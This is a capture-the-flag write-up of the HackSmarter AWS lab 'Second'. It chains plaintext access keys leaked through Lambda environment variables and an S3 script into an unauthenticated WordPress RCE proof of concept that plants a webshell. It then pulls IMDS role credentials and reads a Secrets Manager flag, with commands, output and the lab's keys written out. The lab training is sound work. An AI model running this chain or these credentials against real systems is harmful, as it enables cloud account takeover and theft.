---
title: "Second @ HackSmarter Writeup"
date: 2026-07-21
categories: [HackSmarter, Cloud]
tags: [aws, wp2shell, imds, secrets-manager]
image:
  path: /assets/second.png
---


**Platform:** [Hacksmarter](https://www.hacksmarter.org)  
**Lab:** [Second](https://www.hacksmarter.org/courses/32a677fd-323b-4236-ae70-3cda82d9c0b4/take)
**Difficulty:** Medium


## Objective

We have been hired to perform an AWS pentest against a client's infrastructure. The client has planted a flag in AWS Secrets Manager. If we
are able to retrieve it, it demonstrates full compromise of their AWS account.

For initial access, the client has provided an Access Key and Secret for a low-privileged user. The goal is to see how far that foothold can take us.

## Enumeration

### Configuring the Credentials

First thing is getting the provided credentials configured locally and confirming who we are in the account.

```bash
~> aws configure --profile second

AWS Access Key ID: AKIAQ7H5VOHZW53VSYE4
AWS Secret Access Key: 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
```

```bash
➜ aws sts get-caller-identity --profile second
{
    "UserId": "AIDAQ7H5VOHZZCOCSIURP",
    "Account": "067103977971",
    "Arn": "arn:aws:iam::067103977971:user/cg-pentest-lab"
}
```

We are operating as `cg-pentest-lab`, a low-privileged IAM user in account `067103977971`. The name gives nothing away about what permissions this user has, so the next step is finding out.

### Enumerating with aws-enumerator

Rather than manually guessing which API calls this account can make, I used `aws-enumerator` to brute-force the permitted actions across a set of services.

```bash
~> aws-enumerator dump -services lambda,dynamodb
```
Two permissions came back. The account can call `ListFunctions` on Lambda and `DescribeEndpoints` on DynamoDB. DynamoDB just returned the standard regional endpoint, nothing interesting there. Lambda is worth digging into.

### Checking the Lambda Function

```bash
~> aws lambda list-functions --region us-east-1 --profile second
```

One function came back: `cg-log-processor-lab`, a Python 3.9 function
attached to the role `cg-lambda-role-lab`. The interesting part was not the
function itself but its environment variables. Hardcoded inside the function
configuration were credentials for another account:

```bash
LAMBDA_MANAGER_AK: AKIAQ7H5VOHZYQEQ43ZI
LAMBDA_MANAGER_SK: E9n+KoWpDPvbJ+m23ZW0Gpcrs43hO9QCFtAYuIQK
```

Storing credentials in Lambda environment variables is a common misconfiguration. They show up in plaintext to anyone with `ListFunctions`
or `GetFunction` access, which is exactly what I had.

---

## Configuring the Manager Account

I configured those credentials as a new profile and confirmed the identity.

```bash
➜ aws sts get-caller-identity --profile manager
{
    "UserId": "AIDAQ7H5VOHZQ7JLNUHNJ",
    "Account": "067103977971",
    "Arn": "arn:aws:iam::067103977971:user/cg-lambda-manager-lab"
}
```

A different user, same account.

### Enumerating with the Manager Account

```bash
~>  aws-enumerator dump -services s3,sts
```

Two new permissions: `ListBuckets` on S3 and both `GetCallerIdentity` and `GetSessionToken` on STS. The S3 access is the one to look into.

### Checking the S3 Buckets

Amazon S3 buckets are scalable cloud storage containers provided by AWS,used to hold files, images, backups, and anything else that needs to be accessible from the internet or internally. Think of them as top-level folders where each item inside is an object.

```bash
~>  aws s3 ls --profile manager
2026-07-21 11:10:30 cg-engineering-scripts-lab-067103977971
```

One bucket. I listed its contents.

```bash
➜ aws s3 ls s3://cg-engineering-scripts-lab-067103977971 --profile manager
2026-07-21 11:10:30   316 deployment-script.sh
```

A deployment script. I downloaded it to take a look.

```bash
~>  aws s3 cp s3://cg-engineering-scripts-lab-067103977971/deployment-script.sh . --profile manager
```

```bash
#!/bin/bash
# WordPress Deployment and Backup Automation Script
# Authorized access only.

export AWS_ACCESS_KEY_ID="AKIAYR35WUFD234EMC6H"
export AWS_SECRET_ACCESS_KEY="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"

echo "Starting WordPress backup job..."
# Backup tasks go here...
echo "Backup completed successfully."
```

A third set of credentials, this time for a WordPress backup account, sitting in plaintext inside a script stored in an S3 bucket. Another plain text credential leakage.

---

## Configuring the WordPress Backup Account

```bash
➜ aws configure --profile wordpress

AWS Access Key ID: AKIAYR35WUFD234EMC6H
AWS Secret Access Key: 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
Default region name: us-east-1
```

### Enumerating the Account

```bash
~>  aws-enumerator dump -services ec2
```

Two EC2 permissions came back: `DescribeInstances` and `DescribeTags`.

Amazon EC2 instances are virtual servers running on the AWS cloud. They provide on-demand compute capacity and are commonly used to host web applications and services. Being able to describe them means we can see everything about the running instances in the environment, including their public IP addresses.

### Finding the EC2 Instance

```bash
~>  aws ec2 describe-instances --profile wordpress
```

<img width="1599" height="484" alt="image" src="https://github.com/user-attachments/assets/d5425c9f-ba3b-4b43-99e4-33c49bd78f8a" />


From the output I pulled the public IP address of the instance.
`32.192.236.119`

---

## Enumerating the EC2 Instance

### Nmap

```bash
~>  nmap 32.192.236.119 -sVC --min-rate 1000 -Pn
```

Two ports open. SSH on 22 and HTTP on 80. The HTTP scan identified this as a WordPress 6.9 site called "CG Marketing Portal", and `robots.txt` had `/wp-admin/` listed as a disallowed entry.

<img width="1599" height="780" alt="image" src="https://github.com/user-attachments/assets/c7d6de9b-5052-402f-818a-7f61fef7121a" />


### WordPress RCE via wp2shell

WordPress 6.9 is vulnerable to an unauthenticated RCE chain. The PoC at [https://github.com/Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) abuses an SQLi-to-customizer bridge to create an administrator account
without any prior credentials, then deploys a webshell plugin through that account.

I ran the vulnerability check first to confirm the target was in range.

<img width="1104" height="185" alt="image" src="https://github.com/user-attachments/assets/6143fe10-ed7d-47d8-a05f-be5970d78e77" />


Then triggered the full shell.

```bash
~> /hacksmarter/second/wp2shell-poc python3 wp2shell.py shell http://32.192.236.119/ --interactive
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_fdc597ae8fc0
[*] Authenticating as 'wp2_fdc597ae8fc0'...
[+] Authenticated.
[*] Deploying webshell plugin...
[+] Webshell: http://32.192.236.119/wp-content/plugins/wp2shell_a00019c5/wp2shell_a00019c5.php
[*] Interactive shell — type commands, 'exit' or Ctrl-D to quit.
/var/www/html/wp-content/plugins/wp2shell_a00019c5 $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/wp-content/plugins/wp2shell_a00019c5 $ 
```

We landed as `www-data`. Standard post-exploitation enumeration turned up nothing useful for privilege escalation, no writable crons, no SUID binaries, no sudo entries. Since this is an EC2 instance, there was one more thing worth checking.

### Hitting the Instance Metadata Service (IMDS)

IMDS is a service available on every EC2 instance at the link-local address `169.254.169.254`. It exposes instance metadata including any IAM role credentials attached to the instance. If the instance has a role, those credentials are available to anyone with code execution on the box, no authentication needed.

```bash
/ $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
cg-ec2-role-lab
```

A role is attached. I fetched the temporary credentials for it.

```bash
/ $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab
```

<img width="1587" height="350" alt="image" src="https://github.com/user-attachments/assets/9043c985-8d06-46c4-867d-67411f5df084" />


Got temporary credentials including a session token. I configured them locally as a new profile.

---

## Configuring the EC2 Profile

```bash
~>  aws configure --profile ec2

AWS Access Key ID: ASIAYR35WUFDU34JMF5G
AWS Secret Access Key: 9bW67qsuaD4IziVyq6RsWFSa4wyyv8ahl9LniofW
AWS Session Token: IQoJb3JpZ2luX2VjEPb//<...truncated...>
Default region name: us-east-1
```

```bash
~>  aws sts get-caller-identity --profile ec2
{
    "UserId": "AROAYR35WUFDYVKJEDLUT:i-08ea0c03daf1f1d95",
    "Account": "588137275719",
    "Arn": "arn:aws:sts::588137275719:assumed-role/cg-ec2-role-lab/i-08ea0c03daf1f1d95"
}
```

A different account number this time -- `588137275719`. The EC2 role spans a second account. Enumerating what this role can do showed access to `secretsmanager`.

### Reading Secrets Manager

```bash
~> /hacksmarter/second aws secretsmanager list-secrets --profile ec2
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:588137275719:secret:cg-final-flag-lab-a8UbVO",
            "Name": "cg-final-flag-lab",
            "Description": "CloudGoat Final Flag",
            "LastChangedDate": "2026-07-21T13:46:29.369000+01:00",
            "LastAccessedDate": "2026-07-21T01:00:00+01:00",
            "SecretVersionsToStages": {
                "terraform-uAnwlIkUJcdi8hzU0Y5JqcMTOG": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-07-21T13:46:29.165000+01:00"
        }
    ]
}

```

One secret: `cg-final-flag-lab`, described as "CloudGoat Final Flag". I retrieved it.

```bash
~>  aws secretsmanager get-secret-value --secret-id cg-final-flag-lab --profile ec2
```

<img width="1149" height="294" alt="image" src="https://github.com/user-attachments/assets/bd55fa8b-99e2-4243-a95a-afa072ecddac" />

Hack Smarter, not harder!!!

<img width="1100" height="850" alt="image" src="https://github.com/user-attachments/assets/63393212-49de-4494-88a5-e0100626014c" />


